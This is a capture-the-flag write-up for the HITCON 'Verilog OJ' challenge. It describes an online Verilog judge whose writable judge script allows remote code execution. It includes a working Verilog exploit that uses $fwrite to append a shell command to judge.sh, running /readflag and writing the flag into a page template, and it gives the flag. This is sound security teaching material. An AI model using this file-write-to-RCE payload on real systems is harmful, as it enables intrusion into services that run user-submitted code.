# Verilog OJ
- Tags: `web`, `misc`
- Score: 227/500
- Solves: 44

## Description
> Yes, we need Online Judge for Verilog for our Logic Design course.
> 
> Instancer: http://verilog-oj.chal.hitconctf.com/

## Overview
Verilog arbitrary file write -> overwrite shell script -> RCE

## Recon
The server is written in ruby with puma + roda + slim template engine.  
There is also sidekiq + redis setup for judging task queueing.  
In `app/lib/judge_job.rb`, it prepares the judge code, and calls `scripts/judge.sh` for judging.

```ruby
    def perform(submission_id)
      submission = Submission.first(id: submission_id)
      return if submission.nil? || submission.result != 'Q'

      dir = prepare(submission)
      result, output = judge dir
      submission.update(result: result, output: output) unless result.nil?
      FileUtils.remove_dir(dir, force: true)
    end

    def prepare(submission)
      dir = Dir.mktmpdir("submission_#{submission.id}_")
      File.write("#{dir}/testbench.v", submission.problem.testbench)
      File.write("#{dir}/module.v", submission.code)
      dir
    end

    def judge(dir) # rubocop:disable Metrics/MethodLength
      stdout, stderr, status = Timeout.timeout(15) do
        # To simply error handling, let iverilog and vvp fail in a single script
        script_path = File.realpath("#{File.dirname(__FILE__)}/../../scripts/judge.sh")
        # iverilog is safe to execute
        Open3.capture3("#{script_path} #{dir}")
      end
      # Output parsing...
    end
```

In addition, while judging, the judge script is not isolated at all (with some "confident" comments :P), and the script itself is writable by user `app`.  
One might utilize submitted verilog code to modifiy the judge script for command execution.  

From Dockerfile, one can notice that `/flag` is readonly with root, and one needs to execute `/readflag give me the flag` to get the flag.  


## Exploit
Simply use `$fwrite` to overwrite `judge.sh` with command, submit another code again to execute your command.  
In addition, since there is no external network access for the challenge instance, one can write the flag to any templates/assets to read the flag.  

Exploit:
```verilog
`timescale 1ns/1ps

module Crossbar_2x2_4bit(in1, in2, control, out1, out2);

input [3:0] in1, in2;
input control;
output [3:0] out1, out2;

integer f;
initial begin
    f = $fopen("/app/scripts/judge.sh", "a");
    $fwrite(f, "echo \"p $(/readflag give me the flag)\" >> /app/app/presentation/views/submission.slim");
    $fclose(f);
end

endmodule
```

## Flag
<details>
<summary>Spolier</summary>

`hitcon{1_u$ed_t0_beli3v3_th4t_Judging_VeriloG_is_VERY_S@f3_Fr0m_RCE_QAQ}`
</details>
